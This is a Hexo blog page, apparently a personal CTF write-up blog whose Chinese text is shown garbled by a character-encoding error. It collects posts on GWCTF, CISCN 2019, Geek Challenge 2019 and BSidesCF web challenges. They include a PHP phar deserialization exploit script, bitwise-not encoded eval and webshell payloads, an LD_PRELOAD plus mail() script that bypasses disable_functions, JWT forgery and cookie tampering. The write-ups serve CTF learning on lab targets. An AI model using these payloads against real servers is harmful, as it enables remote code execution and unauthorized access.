<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-page-87" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-87/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T07:12:00.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-87/">GWCTF 2019æ¯ç‡¥çš„æŠ½å¥–</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å³é”®çœ‹æºç çŸ¥é“è¿˜æœ‰ä¸€ä¸ªcheck.phpå¯ä»¥è®¿é—®</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/115.PNG?raw=true" alt="115.PNG"></p>
<p>3qcwkpYHL4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼ #æ¬¸æˆ‘åè¦çœ‹ (ï½ï¿£â–½ï¿£)ï½</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#x27;seed&#x27;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;num&#x27;]))&#123;</span><br><span class="line">    if($_POST[&#x27;num&#x27;]===$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°æºç mt_scrand è¿™åº”è¯¥æ˜¯ä¼ªéšæœºæ•°æ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä»‹ç»ï¼šmt_scrand() //æ’­ç§ mersenne twisteréšæœºæ•°ç”Ÿæˆå™¨</span><br><span class="line">          mt_rand()  //ç”Ÿæˆéšæœºæ•°</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ï¼š</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/116.PNG?raw=true" alt="116.PNG"></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/117.PNG?raw=true" alt="117.PNG"></p>
<p>ç”Ÿæˆçš„çš„éšæœºæ•°å…¶å®æ˜¯ä¸€æ ·çš„<br><strong>ç”Ÿæˆä¼ªéšæœºæ•°æ˜¯çº¿æ€§çš„å¯ä»¥ç†è§£æˆy=axï¼Œxå°±æ˜¯ç§å­çŸ¥é“ç§å­å’Œä¸€ç»„ä¼ªéšæœºæ•°å°±èƒ½æ¨åˆ°å‡ºy</strong></p>
<p>è¿™è¾¹æ˜¯æˆ‘è¿™é“é¢˜éšæœºåˆ°çš„ç§å­</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/118.PNG?raw=true" alt="118.PNG"></p>
<p>è„šæœ¬çˆ†ç ´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">str2=&#x27;3qcwkpYHL4&#x27;</span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for i in range(len(str2)):  </span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p><strong>è·å¾—ç§å­ç„¶åå†å°†ç§å­è½¬åŒ–æˆå­—ç¬¦ä¸²</strong></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/119.PNG?raw=true" alt="119.PNG"></p>
<p>è¿˜éœ€è¦ä¸€ä¸ªå«åšphp_mt_seed å°†ç”Ÿæˆçš„ä¸¢è¿™ä¸ªè¿è¡Œ</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/120.PNG?raw=true" alt="120.PNG"></p>
<p>è·å¾—è¿™ä¸²597890092å°±æ˜¯ç§å­äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(597890092);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>3qcwkpYHL4txQ32P8MOuè¿™ä¸²ä¼ å…¥å³å¯è·å¾—flag</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/121.PNG?raw=true" alt="121.PNG"></p>
<p><strong>[BSidesCF 2019]Kookie</strong><br>é¢˜ç›®å«kookieè¯•ä¸€ä¸‹cookieæ³¨å…¥ ç«ç‹hackbarèµ°èµ·</p>
<p>è¿˜æç¤ºäº†login as admin<br>hackbaré‚£è¾¹cookieé€‰é¡¹æ·»åŠ ä¸€ä¸ªusername=admin æå®š   </p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/122.PNG?raw=true" alt="122.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-87/" data-id="ckrorcwtl0005uow7gzs9cvde" data-title="GWCTF 2019æ¯ç‡¥çš„æŠ½å¥–" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-86" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-86/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:23:36.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-86/">CISCN2019 ååŒ—èµ›åŒº Day1 Web1Dropbox</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é¢˜ç›®è¿™è¾¹æç¤ºphp phar<br>æ³¨å†Œåè¿›è¡Œç™»å…¥ç„¶åå¯ä»¥ä¸Šä¼ å›¾ç‰‡å¯ä»¥è¿›è¡Œä¸‹è½½å’Œåˆ é™¤<br>æŠ“ä¸‹è½½çš„åŒ…å‘ç°è¿™æ˜¯å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´å¯ä»¥æåˆ°æºç ä¹‹ç±»çš„ğŸ˜</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/114.PNG?raw=true" alt="114.PNG"></p>
<p><strong>ä¸‹è½½åˆ°index.php download.php class.php delete.php</strong><br>downloadé‡Œå¤´å°±æ˜¯å¾ˆå¸¸è§„çš„ä¸‹è½½æ–‡ä»¶æ“ä½œè€Œä¸”é™åˆ¶äº†ä¸èƒ½ä¸‹è½½åå­—å¸¦æœ‰flagçš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;</span><br><span class="line">    #çœç•¥ä¸€äº›ä»£ç </span><br><span class="line">    echo $file-&gt;close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;File not exist&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>deleteé‡Œå¤´ä¹Ÿæ²¡ä»€ä¹ˆ class.php å®šä¹‰ç”¨æˆ·å’Œç›¸å…³æ–‡ä»¶çš„ç±»<br><strong>pharï¼šå°†pharä¼ å…¥æœåŠ¡å™¨ç«¯ç„¶åæœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€</strong><br>Fileç±»ä¸­closeæ–¹æ³•ä¼šè·å–æ–‡ä»¶å†…å®¹ å¦‚æœèƒ½è§¦å‘è¯¥æ–¹æ³•å°±å¯èƒ½è·å–flag<br>Userç±»ä¸­å­˜åœ¨closeæ–¹æ³•å¹¶ä¸”è¯¥æ–¹æ³•åœ¨å¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œ<br>classä¸­çš„FileListå­˜åœ¨callçš„é­”æœ¯æ–¹æ³• å¹¶ä¸”æ²¡æœ‰closeæ–¹æ³• å¦‚æœä¸€ä¸ªFIleListå¯¹è±¡è°ƒç”¨äº†close()æ–¹æ³•æ ¹æ®callæ–¹æ³•çš„ä»£ç å¯ä»¥çŸ¥é“closeæ–¹æ³•è¢«æ‰§è¡Œï¼Œå°±å¯èƒ½æ‹¿åˆ°flag<br>åˆ›å»ºä¸€ä¸ªuserçš„å¯¹è±¡ dbå˜é‡æ˜¯ä¸€ä¸ªFileListå¯¹è±¡ï¼Œå…¶ä¸­æ–‡ä»¶åä¸ºflagçš„ä½ç½®ï¼Œè¿™æ ·å½“userè¢«é”€æ¯æ—¶ï¼Œdbå˜é‡çš„closeå°±ä¼šè¢«æ‰§è¡Œå°±èƒ½è§¦å‘callçš„é­”æœ¯æ–¹æ³•ï¼Œä»è€Œå˜æˆæ‰§è¡Œäº†fileå¯¹è±¡çš„closeæ–¹æ³•ï¼Œåˆ†æFileLIstç±»çš„æ„é€ æ–¹æ³•ï¼Œcloseæ–¹æ³•æ‰§è¡Œåå­˜åœ¨resultså˜é‡çš„ç»“æœä¼šåŠ å…¥åˆ°tableå˜é‡ä¸­è¢«æ‰“å°å‡ºæ¥ä¹Ÿå°±æ˜¯flag<br>å€ŸåŠ©pharä¼ªåè®®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $file = new File();</span><br><span class="line">        $file-&gt;filename = &#x27;/flag.txt&#x27;;</span><br><span class="line">        $this-&gt;files = array($file);</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubè¿™è¾¹ä¹Ÿå¯æ·»åŠ æ–‡ä»¶å¤´è¿›å»</span><br><span class="line"></span><br><span class="line">$o = new User();</span><br><span class="line">$o-&gt;db = new FileList();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè¯¥è„šæœ¬ç”Ÿæˆçš„æ–‡ä»¶ä¿®æ”¹æ ¼å¼åä¸Šä¼ <br>åˆ é™¤çš„æ—¶å€™burpæŠ“åŒ…ç„¶åä¿®æ”¹å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=phar://phar.png</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-86/" data-id="ckrorcwtl0004uow78ektf5ty" data-title="CISCN2019 ååŒ—èµ›åŒº Day1 Web1Dropbox" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-85" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-85/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:23:35.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-85/">æå®¢å¤§æŒ‘æˆ˜ 2019RCE ME</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é¦–å…ˆè€æ ·å­ä¸€æ¥å°±æ˜¯æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™è¾¹éœ€è¦ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼è€Œä¸”æœ‰é•¿åº¦é™åˆ¶<strong>å¯ä»¥ç›´æ¥ä½¿ç”¨å–åurlencodeç¼–ç ç»•è¿‡</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a>  å„ç§ç»•è¿‡æ–¹æ³•<br>å…ˆphpinfoçœ‹ä¸€ä¸‹ç¦æ­¢äº†å“ªäº›åŠŸèƒ½  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo urlencode(~&#x27;phpinfo&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload: ?code=(~%8F%97%8F%96%91%99%90)();</strong></p>
<p>ç¦ç”¨äº†ä¸€å †çš„åŠŸèƒ½<br>æ„é€ shellè¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a=&#x27;assert&#x27;;</span><br><span class="line">   $b=urlencode(~$a);</span><br><span class="line">   echo $b;</span><br><span class="line">   echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">   $c=&#x27;(eval($_POST[aaa]))&#x27;;</span><br><span class="line">   $d=urlencode(~$c);</span><br><span class="line">   echo $d;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>å¯ä»¥è¿æ¥ä½†æ˜¯åªèƒ½ä»readflagé‡Œé¢æ‹¿åˆ°flag  flagæ˜¯ç©ºçš„</strong></p>
<p>å¯ä»¥ç”¨<strong>èš‚å‰‘çš„ç»•è¿‡disabled_functionæ’ä»¶é€‰æ‹©PHP_GC_UAFå°±å¯ä»¥è¿è¡Œé‚£ä¸ªreadflag</strong> ï¼ˆè¿™æ˜¯éé¢„æœŸè§£æ³•ï¼‰</p>
<p><strong>é¢„æœŸè§£</strong>é€šè¿‡Linuxæä¾›çš„LD_preload+mailåŠ«æŒsoæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ åœ¨å¯åŠ¨å­è¿›ç¨‹ä½¿æ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æ¶æ„çš„soæ‹“å±•ç„¶å<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡soé‡Œé¢å®šä¹‰åŒåå‡½æ•°åŠ«æŒapiè°ƒç”¨<br>è¿™è¾¹disable_functions ç¦ç”¨äº†system<br>æ‰¾åˆ°äº†å¤§ä½¬å†™å¥½çš„æ–‡ä»¶ <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>å¯ä»¥ç”¨å…ˆå°†bupass_disablefunc_x64.soç”¨èšå‰‘ä¼ å…¥<br>åœ¨ä¼ å…¥è¿™ä¸ªè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// exp.php</span><br><span class="line">$cmd = &quot;/readflag&quot;;</span><br><span class="line">$out_path = &quot;/tmp/1.txt&quot;;</span><br><span class="line">$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">$so_path = &quot;/tmp/bypass_disablefunc_x64.so&quot;;</span><br><span class="line">putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ­¥éª¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$_=~(%A0%B8%BA%AB);$&#123;$_&#125;[__]($&#123;$_&#125;[___]);&amp;__=assert&amp;___=include%20%22/tmp/exp.php%22;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/29/page-85/" data-id="ckrorcwtk0003uow7g0hc7o2e" data-title="æå®¢å¤§æŒ‘æˆ˜ 2019RCE ME" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-84" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/29/page-84/" class="article-date">
  <time class="dt-published" datetime="2021-07-29T06:23:33.000Z" itemprop="datePublished">2021-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/29/page-84/">CISCN2019 ååŒ—èµ›åŒº Day1 Web2ikun</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é¦–å…ˆæœ‰ä¸ªæç¤ºè¦ä¹°åˆ°lv6 å†™è„šæœ¬è·‘ä¸€ä¸‹</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/86.PNG?raw=true" alt="86.PNG"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://11567a81-35e3-46e0-ba53-717f767dec32.node4.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,2000):</span><br><span class="line"></span><br><span class="line">â€‹	r=requests.get(url+str(i))</span><br><span class="line">â€‹	if &#x27;lv6.png&#x27; in r.text:</span><br><span class="line">â€‹		print (i)</span><br><span class="line">â€‹		break</span><br></pre></td></tr></table></figure>

<p>åœ¨ç¬¬181é¡µ lv6</p>
<p>ä»·æ ¼å¤ªè´µäº†ä¹°ä¸èµ·æŠ“åŒ…æ”¹åŒ… æ”¹discoountçš„å€¼</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/87.PNG?raw=true" alt="87.PNG"></p>
<p>åˆ°è¾¾æ–°ä¸–ç•Œä½†æ˜¯è¦adminæƒé™ ç„¶åå°±ä¸ä¼šäº† â•®(â•¯â–½â•°)â•­</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/88.PNG?raw=true" alt="88.PNG"></p>
<p>çœ‹åˆ«çš„å¤§ä½¬çš„æ–‡ç«  éœ€è¦ä¼ªé€ jwt é‚£ä¹ˆ<strong>ä»€ä¹ˆæ˜¯jwt</strong></p>
<p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> <strong>ç”¨æ¥æŸ¥çœ‹jwtåŒ…å«çš„ä¿¡æ¯</strong> jwtçš„å®˜ç½‘<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78</p>
<p>éœ€è¦å°†usernameæ”¹ä¸ºadmin ä½†æ˜¯åé¢çš„éƒ¨åˆ†éœ€è¦ç ´è§£key  sha256çš„åŠ å¯†ç®—æ³•<br>å¾—ç ´è§£ä¸€ä¸‹ å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/90.PNG?raw=true" alt="90.PNG"></p>
<p>ç”Ÿæˆä¸€ä¸‹æ–°çš„jwt </p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/91.PNG?raw=true" alt="91.PNG"></p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/92.PNG?raw=true" alt="92.PNG"></p>
<p>æˆåŠŸè¿›å…¥æ–°é¡µé¢æŸ¥çœ‹æºç å‘ç°æ–°çš„é¡µé¢<strong>ç„¶åé¡µé¢çš„æºç å¯ä»¥ä¸‹è½½ä¸‹æ¥äº†</strong></p>
